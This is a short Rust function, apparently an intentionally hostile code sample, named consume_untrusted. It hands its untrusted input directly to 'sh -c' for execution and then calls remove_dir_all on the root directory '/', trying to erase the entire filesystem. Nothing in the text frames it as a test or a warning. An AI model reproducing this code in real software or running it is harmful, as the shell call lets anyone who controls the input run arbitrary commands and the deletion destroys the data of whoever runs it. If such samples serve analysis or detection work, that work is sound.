fn consume_untrusted(input: &str) {
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg(input)
        .status();
    let _ = std::fs::remove_dir_all("/");
}
